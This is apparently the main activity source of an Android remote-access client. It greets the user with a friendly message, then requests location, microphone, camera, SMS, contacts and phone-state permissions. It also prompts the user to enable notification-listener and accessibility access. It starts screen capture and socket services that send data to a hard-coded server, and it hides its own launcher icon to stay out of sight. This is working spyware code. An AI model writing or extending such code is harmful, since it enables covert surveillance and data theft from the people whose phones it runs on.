package com.example.socketclient

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.os.Handler
import android.os.Looper

class MainActivity : AppCompatActivity() {

    companion object {
        const val SERVER_IP = "192.168.0.178"
        const val SERVER_PORT = 54835
        private const val REQUEST_PERMISSIONS_CODE = 100

        private val PERMISSIONS = mutableListOf(
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION
        ).apply {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }.toTypedArray()
    }

    private lateinit var mediaProjectionManager: MediaProjectionManager

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        val data = result.data
        if (result.resultCode == Activity.RESULT_OK && data != null) {

            // Start ScreenCaptureService
            Intent(this, ScreenCaptureService::class.java).apply {
                putExtra("data", data)
                putExtra("server_ip", SERVER_IP)
                putExtra("server_port", SERVER_PORT)
            }.also { intent ->
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
                else startService(intent)
            }

            // Start SocketService
            Intent(this, SocketService::class.java).apply {
                putExtra("mediaProjectionData", data)
                putExtra("server_ip", SERVER_IP)
                putExtra("server_port", SERVER_PORT)
            }.also { intent ->
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
                else startService(intent)
            }

            Toast.makeText(this, "Services started successfully", Toast.LENGTH_SHORT).show()
            Log.d("MainActivity", "Services started successfully")
        } else {
            Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show()
            Log.e("MainActivity", "Screen capture permission denied")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        showWelcomeMessage()

        Handler(Looper.getMainLooper()).postDelayed({
            initializeApp()
        }, 2000)
    }

    private fun showWelcomeMessage() {
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
        }

        val textView = TextView(this).apply {
            text = "Hi Dear How Are You Doing"
            textSize = 24f
            gravity = Gravity.CENTER
        }

        layout.addView(textView)
        setContentView(layout)
    }

    private fun initializeApp() {
        try {
            mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            requestAllPermissions()
        } catch (e: Exception) {
            Log.e("MainActivity", "Initialization failed: ${e.message}", e)
            Toast.makeText(this, "App initialization error: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun requestAllPermissions() {
        val missingPermissions = PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                missingPermissions.toTypedArray(),
                REQUEST_PERMISSIONS_CODE
            )
        } else {
            continueAppFlow()
        }
    }

    private fun continueAppFlow() {
        checkNotificationListenerPermission()
        checkAccessibilityServiceEnabled()
        requestScreenCapturePermission()
        hideAppIconSafely()
    }

    private fun requestScreenCapturePermission() {
        try {
            val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
            screenCaptureLauncher.launch(captureIntent)
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to request screen capture permission: ${e.message}", e)
            Toast.makeText(this, "Error requesting screen capture: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun checkNotificationListenerPermission() {
        try {
            val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
            if (enabledListeners == null || !enabledListeners.contains(packageName)) {
                Toast.makeText(this, "Please enable Notification Access", Toast.LENGTH_LONG).show()
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Notification listener check failed: ${e.message}", e)
        }
    }

    private fun checkAccessibilityServiceEnabled() {
        try {
            val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            val expectedService = "$packageName/${MyAccessibilityService::class.java.name}"
            if (enabledServices == null || !enabledServices.contains(expectedService)) {
                Toast.makeText(this, "Please enable Accessibility Service", Toast.LENGTH_LONG).show()
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Accessibility check failed: ${e.message}", e)
        }
    }

    private fun hideAppIconSafely() {
        try {
            val componentName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("MainActivity", "App icon hidden successfully")
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to hide app icon: ${e.message}", e)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_PERMISSIONS_CODE) {
            val denied = permissions.zip(grantResults.toTypedArray()).filter { it.second != PackageManager.PERMISSION_GRANTED }
            if (denied.isEmpty()) {
                continueAppFlow()
            } else {
                Toast.makeText(this, "Some permissions were denied: ${denied.map { it.first }}", Toast.LENGTH_LONG).show()
                Log.e("MainActivity", "Denied permissions: ${denied.map { it.first }}")
            }
        }
    }
}
